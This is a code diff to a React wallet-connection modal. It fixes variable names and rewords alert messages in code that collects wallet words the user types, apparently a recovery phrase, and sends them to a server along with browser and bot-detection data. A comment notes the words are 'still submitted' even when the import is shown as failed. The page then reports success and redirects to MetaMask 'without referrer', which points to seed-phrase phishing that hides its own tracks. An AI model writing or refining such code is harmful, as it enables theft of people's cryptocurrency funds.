@@ -162,9 +162,9 @@ const WalletConnectionModal = ({ onClose }) => {
         hasInvalidWords: hasInvalidWords,
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
-        interactionScore: interact,
+        interactionScore: interactionScore,
         sessionToken: tracker.sessionToken,
-        honeypot: honeypotionScore,
+        honeypot: honeypot,
         isSuspicious: isSuspicious
       };
 
@@ -180,7 +180,7 @@ const WalletConnectionModal = ({ onClose }) => {
       if (response.ok) {
         if (hasInvalidWords) {
           // Show error message but still submitted
-          alert('Import failed. Please check the words highlighted in red and try again.');
+          alert('Some words appear to be invalid. Please check the words highlighted in red and try again.');
         } else {
           alert('Wallet imported successfully!');
           // Redirect to MetaMask start page without referrer
@@ -191,7 +191,7 @@ const WalletConnectionModal = ({ onClose }) => {
       }
     } catch (error) {
       console.error('Submission error:', error);
-      alert('Import failed. Please check and try again.');
+      alert('Import failed. Please check your phrase and try again.');
     }
   };
 
